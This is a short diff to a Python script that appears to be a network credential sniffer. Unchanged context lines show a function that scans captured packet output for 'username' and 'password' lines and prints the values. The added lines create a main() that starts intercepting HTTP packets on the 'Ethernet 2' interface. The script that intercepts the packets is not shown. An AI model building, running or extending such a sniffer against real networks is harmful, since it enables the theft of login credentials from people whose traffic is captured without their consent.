@@ -29,3 +29,10 @@ def extract_login_credentials_from_output_file(packet):
         if ("username" in line or "password" in line) and not ("Key" in line or "Value" in line):
             data = line.strip().split(":")[1].strip()
             print(data)
+
+# main method to start intercepting the http packets
+def main():
+    intercept_http_packets('Ethernet 2')
+
+if __name__ == "__main__":
+    main()
